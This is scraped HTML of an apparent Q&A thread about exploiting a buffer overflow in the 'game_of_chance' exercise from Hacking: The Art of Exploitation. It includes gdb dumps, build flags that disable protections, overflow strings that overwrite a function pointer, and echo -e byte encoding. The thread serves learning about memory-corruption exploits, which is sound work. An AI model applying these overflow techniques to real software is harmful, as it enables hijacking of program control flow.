The source code is\n  <a href=\"https://github.com/intere/hacking/blob/master/booksrc/game_of_chance.c\" rel=\"nofollow noreferrer\">\n   here\n  </a>\n  . It is from the book, Hacking the Art of Exploitation. The subject here is the below struct:\n </p>\n <pre><code>struct user {\n   int uid;\n   int credits;\n   int highscore;\n   char name[100];\n   int (*current_game) ();\n};\n</code></pre>\n <p>\n  The idea is to overflow name[100] such that the address provided\n  <em>\n   after\n  </em>\n  the 100 letter A's will\n  <em>\n   overwrite the address of the function pointer, entitled current_game\n  </em>\n  .\n </p>\n <p>\n  However, please see the below gdb readout:\n </p>\n <pre><code>[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��048e2c]\n56        printf(\"[You have %u credits] ->  \", player.credits);\n(gdb) x/40x player.name\n0x804c08c <player+12>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c09c <player+28>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ac <player+44>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0bc <player+60>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0cc <player+76>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0dc <player+92>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ec <player+108>:   0x41414141  0x080490bb  0x65383430  0x00006332\n0x804c0fc:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c10c:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c11c:  0x00000000  0x00000000  0x00000000  0x00000000\n(gdb) x/5x player.current_game\n0x80490bb <pick_a_number>:    0x83e58955  0xec8318ec  0x9d2e680c  0xa2e80804\n0x80490cb <pick_a_number+16>: 0x83fffff4\n(gdb) print 6*16\n$2 = 96\n</code></pre>\n <p>\n  I've placed the address of another function into player.name as noted by the\n  <code>\n   [Name: A*100 ...\n  </code>\n  line. Below this, you can see the memory layout, how there are indeed 100 A's in memory. However, after the final A, we see that the next memory spot is\n  <code>\n   0x080490bb\n  </code>\n  and\n  <em>\n   has not\n  </em>\n  been overwritten, even though we see that the player.name buffer does indeed contain an overflow just prior. I've shown a printout of player.current_game afterwards to display that it is indeed at address\n  <code>\n   0x80490bb\n  </code>\n  which is what we see in the dump directly after the last 0x41414141. I am baffled here.\n </p>\n <h1>\n  What I've Tried:\n </h1>\n <ol>\n  <li>\n   Disabled ASLR on my Fedora 25 by setting\n   <code>\n    /proc/sys/kernel/randomize_va_space\n   </code>\n   to 0.\n  </li>\n  <li>\n   Enabled executable stack in gcc.\n  </li>\n  <li>\n   Turned off the stack protection in gcc.\n  </li>\n  <li>\n   Turned off PIE\n  </li>\n  <li>\n   You can confirm with this command that I used to make the binary:\n   <code>\n    gcc  -z execstack game_of_chance.c -fno-stack-protector -no-pie -m32 -o goc\n   </code>\n  </li>\n  <li>\n   I've tried writing the address in as \\x2c\\x8e\\x04\\08 AND just straight 0x08048e2c, neither work. This is the address of the function I'm trying to run.\n  </li>\n  <li>\n   Observed that paddr and vaddr are the same throughout multiple executions of the program.\n  </li>\n  <li>\n   <p>\n    Debugged in both gdb as you see, as well as Radare2.

Additionally, I placed read/write watches on 0x804c0ec to see if I could find anything writing but was not successful in finding anything else.\n </p>\n</div>\n</body></html>",

Lets go through this step by step, shall we?\n </p>\n <h1>\n  1. Set up\n </h1>\n <p>\n  I used your command line to compile the program:\n </p>\n <pre><code>gcc  -z execstack game_of_chance.c -fno-stack-protector -no-pie -m32 -o goc\n</code></pre>\n <p>\n  I've done one small change though, I changed\n </p>\n <pre><code>#define DATAFILE \"/var/chance.data\" // File to store user data\n</code></pre>\n <p>\n  to\n </p>\n <pre><code>#define DATAFILE \"chance.data\" // File to store user data\n</code></pre>\n <p>\n  for some peace of mind.\n </p>\n <h1>\n  2.

The only thing we need to remember is that we chose '1' at the game menu though.\n </p>\n <h1>\n  3. Exploit it!\n </h1>\n <p>\n  Lets start by changing our name to overwrite the pointer:\n </p>\n <blockquote>\n  <p>\n   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\n  </p>\n </blockquote>\n <p>\n  <a href=\"https://i.sstatic.net/bixTa.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"SegFault\" src=\"https://i.sstatic.net/bixTa.png\"/>\n  </a>\n </p>\n <p>\n  Something happened! Shoudln't that also work with just 4x BBBB at the end? Nope! But why? My best guess: stack alignment. Let's check this out.\n </p>\n <h1>\n  4. Toying around\n </h1>\n <p>\n  In game_of_choice.c I've changed\n </p>\n <pre><code>char name[100];\n</code></pre>\n <p>\n  to\n </p>\n <pre><code>char name[128];\n</code></pre>\n <p>\n  And tried the same with 128 times 'A':\n </p>\n <blockquote>\n  <p>\n   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n  </p>\n </blockquote>\n <p>\n  It works. So it seems your problem was stack alignment\n </p>\n <p>\n  The standard value of -mpreferred-stack-boundary seems to be 4, meaning gcc is trying to create 16-byte aligned stack boundaries.\n </p>\n <h1>\n  5. ASCII fun\n </h1>\n <p>\n  The program is reading a string from the command line. What we want is to pass the address\n  <code>\n   0x08048e2c\n  </code>\n  in this string in a fashion is can be jumped too. The problem is that if we just write\n  <code>\n   08048e2c\n  </code>\n  , we are actually passing\n  <code>\n   0x3038303438653263\n  </code>\n  (\n  <code>\n   0\n  </code>\n  turns into\n  <code>\n   0x30\n  </code>\n  ,\n  <code>\n   8\n  </code>\n  ->\n  <code>\n   0x38\n  </code>\n  , and so on each digit is a one byte number) as a value to the program. So we need to pass the actual bytes that make up the address.\n </p>\n <p>\n  When we pass\n  <code>\n   \\x2c\\x8e\\x04\\x08\n  </code>\n  in the string, we actually pass\n  <code>\n   0x5c7832635c7838655c7830345c3038\n  </code>\n  , because it is still interpreted as a sequence of characters which are translated to byte values one by one.\n </p>\n <p>\n  When we have a look at any ASCII table, we notice that\n  <code>\n   \\x08\n  </code>\n  translates to the special backspace-character. We certainly can not include it in text.\n </p>\n <p>\n  Using perl -e or echo -e, we let the corresponding program know it should look out for escape sequences when it receives a string. So they actually output the 'real' byte values.\n </p>\n <pre><code>echo -e '\\x2c\\x8e\\x04\\08'\n</code></pre>\n</div>\n</body></html>",
